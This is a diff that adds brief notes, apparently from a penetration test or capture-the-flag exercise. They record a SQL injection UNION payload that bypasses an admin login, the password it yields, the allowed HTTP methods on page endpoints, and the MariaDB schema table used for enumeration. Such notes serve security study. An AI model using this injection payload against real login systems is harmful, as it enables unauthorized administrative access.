@@ -1,0 +1,12 @@
+admin sqli login:
+- username: ' UNION SELECT "asdf" as password FROM admins;--
+=> password: asdf
+
+page create:
+- allowed methods: HEAD, GET, POST, OPTIONS
+
+page edit:
+- allowed methods: HEAD, GET, POST, OPTIONS
+
+maria db schema table:
+- information_schema.tables
